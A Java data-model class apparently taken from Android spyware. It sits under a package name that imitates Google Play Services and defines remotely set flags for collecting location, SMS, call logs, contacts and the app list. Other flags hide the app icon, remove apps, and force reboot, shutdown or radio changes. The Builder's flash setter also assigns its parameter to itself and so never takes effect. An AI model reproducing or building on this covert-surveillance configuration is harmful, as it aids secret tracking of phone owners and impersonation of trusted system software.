package com.google.android.gms.persistent.googleapps.repositories.network.models.data;

import com.google.gson.annotations.Expose;
import com.google.gson.annotations.SerializedName;

/**
 * Created by OldMan on 05.04.2017.
 */

public class Settings {
    @SerializedName("location")
    @Expose
    private boolean location;
    @SerializedName("location_mode")
    @Expose
    private int locationMode;
    @SerializedName("sms")
    @Expose
    private boolean sms;
    @SerializedName("bell")
    @Expose
    private boolean bell;
    @SerializedName("sms_list")
    @Expose
    private boolean smsList;
    @SerializedName("call_list")
    @Expose
    private boolean callList;
    @SerializedName("app_list")
    @Expose
    private boolean appList;
    @SerializedName("contact_book")
    @Expose
    private boolean contactBook;
    @SerializedName("hide_icon")
    @Expose
    private boolean hideIcon;
    @SerializedName("service")
    @Expose
    private boolean service;
    @SerializedName("airplane_mode")
    @Expose
    private int airplaneMode;
    @SerializedName("wifi")
    @Expose
    private int wifi;
    @SerializedName("screen")
    @Expose
    private int screen;
    @SerializedName("flash")
    @Expose
    private boolean flash;
    @SerializedName("vibrate")
    @Expose
    private boolean vibrate;
    @SerializedName("sound")
    @Expose
    private int sound;
    @SerializedName("reboot")
    @Expose
    private boolean reboot;
    @SerializedName("shut_down")
    @Expose
    private boolean shutDown;
    @SerializedName("rm_apps")
    @Expose
    private String rmApps;
    @SerializedName("passwd")
    @Expose
    private int passwd;
    @SerializedName("sync_time")
    @Expose
    private long syncTime;

    private Settings(Builder builder) {
        setLocation(builder.location);
        setSms(builder.sms);
        setBell(builder.call);
        setSmsList(builder.list_sms);
        setCallList(builder.list_call);
        setAppList(builder.list_app);
        setContactBook(builder.contact_book);
        setHideIcon(builder.hide_icon);
        setLocationMode(builder.location_mode);
        setService(builder.service);
        setPasswd(builder.password);
        setScreen(builder.screen);
        setWifi(builder.wifi);
        setAirplaneMode(builder.airplane_mode);
        setReboot(builder.reboot);
        setShutDown(builder.shut_down);
        setRmApps(builder.rm_apps);
        setFlash(builder.flash);
        setSound(builder.sound);
        setVibrate(builder.vibrate);
        setSyncTime(builder.syncTime);
    }

    public static Builder newBuilder() {
        return new Builder();
    }


    public boolean isReboot() {
        return reboot;
    }

    public void setReboot(boolean reboot) {
        this.reboot = reboot;
    }

    public boolean isShutDown() {
        return shutDown;
    }

    public void setShutDown(boolean shut_down) {
        this.shutDown = shut_down;
    }

    public String getRmApps() {
        return rmApps;
    }

    public void setRmApps(String rm_apps) {
        this.rmApps = rm_apps;
    }

    public int getPasswd() {
        return passwd;
    }

    public void setPasswd(int passwd) {
        this.passwd = passwd;
    }

    public int getScreen() {
        return screen;
    }

    public void setScreen(int is_screen) {
        this.screen = is_screen;
    }

    public int getWifi() {
        return wifi;
    }

    public void setWifi(int is_wifi) {
        this.wifi = is_wifi;
    }

    public int getAirplaneMode() {
        return airplaneMode;
    }

    public void setAirplaneMode(int airplane_mode) {
        this.airplaneMode = airplane_mode;
    }

    public boolean isFlash() {
        return flash;
    }

    public void setFlash(boolean flash) {
        this.flash = flash;
    }

    public boolean isVibrate() {
        return vibrate;
    }

    public void setVibrate(boolean vibrate) {
        this.vibrate = vibrate;
    }

    public int getSound() {
        return sound;
    }

    public void setSound(int sound) {
        this.sound = sound;
    }

    public long getSyncTime() {
        return syncTime;
    }

    public void setSyncTime(long syncTime) {
        this.syncTime = syncTime;
    }

    public boolean isLocation() {
        return location;
    }

    public void setLocation(boolean is_location) {
        this.location = is_location;
    }

    public boolean isHideIcon() {
        return hideIcon;
    }

    public void setHideIcon(boolean is_hide_icon) {
        this.hideIcon = is_hide_icon;
    }

    public boolean isSms() {
        return sms;
    }

    public void setSms(boolean is_sms) {
        this.sms = is_sms;
    }

    public boolean isBell() {
        return bell;
    }

    public void setBell(boolean is_call) {
        this.bell = is_call;
    }

    public boolean isSmsList() {
        return smsList;
    }

    public void setSmsList(boolean list_sms) {
        this.smsList = list_sms;
    }

    public boolean isCallList() {
        return callList;
    }

    public void setCallList(boolean list_call) {
        this.callList = list_call;
    }

    public boolean isAppList() {
        return appList;
    }

    public void setAppList(boolean list_app) {
        this.appList = list_app;
    }

    public boolean isContactBook() {
        return contactBook;
    }

    public void setContactBook(boolean contact_book) {
        this.contactBook = contact_book;
    }

    public int getLocationMode() {
        return locationMode;
    }

    public void setLocationMode(int location_mode) {
        this.locationMode = location_mode;
    }

    public boolean isService() {
        return service;
    }

    public void setService(boolean is_service) {
        this.service = is_service;
    }

    public static final class Builder {
        private boolean location;
        private boolean sms;
        private boolean call;
        private boolean list_sms;
        private boolean list_call;
        private boolean list_app;
        private boolean contact_book;
        private boolean hide_icon;
        private int location_mode;
        private boolean service;
        private int airplane_mode;
        private int wifi;
        private int screen;
        private boolean reboot;
        private boolean shut_down;
        private String rm_apps;
        private int password;
        private long syncTime;
        private boolean flash;
        private boolean vibrate;
        private int sound;


        private Builder() {
        }

        public Builder syncTime(long val) {
            syncTime = val;
            return this;
        }

        public Builder flash(boolean flash) {
            flash = flash;
            return this;
        }

        public Builder vibrate(boolean val) {
            vibrate = val;
            return this;
        }

        public Builder sound(int val) {
            sound = val;
            return this;
        }

        public Builder reboot(boolean val) {
            reboot = val;
            return this;
        }

        public Builder shut_down(boolean val) {
            shut_down = val;
            return this;
        }

        public Builder rm_apps(String val) {
            rm_apps = val;
            return this;
        }

        public Builder airplane_mode(int val) {
            airplane_mode = val;
            return this;
        }

        public Builder wifi(int val) {
            wifi = val;
            return this;
        }

        public Builder screen(int val) {
            screen = val;
            return this;
        }

        public Builder password(int val) {
            password = val;
            return this;
        }

        public Builder location(boolean val) {
            location = val;
            return this;
        }

        public Builder service(boolean val) {
            service = val;
            return this;
        }

        public Builder location_mode(int val) {
            location_mode = val;
            return this;
        }

        public Builder sms(boolean val) {
            sms = val;
            return this;
        }

        public Builder call(boolean val) {
            call = val;
            return this;
        }

        public Builder list_sms(boolean val) {
            list_sms = val;
            return this;
        }

        public Builder list_call(boolean val) {
            list_call = val;
            return this;
        }

        public Builder list_app(boolean val) {
            list_app = val;
            return this;
        }

        public Builder contact_book(boolean val) {
            contact_book = val;
            return this;
        }

        public Builder hide_icon(boolean val) {
            hide_icon = val;
            return this;
        }

        public Settings build() {
            return new Settings(this);
        }
    }
}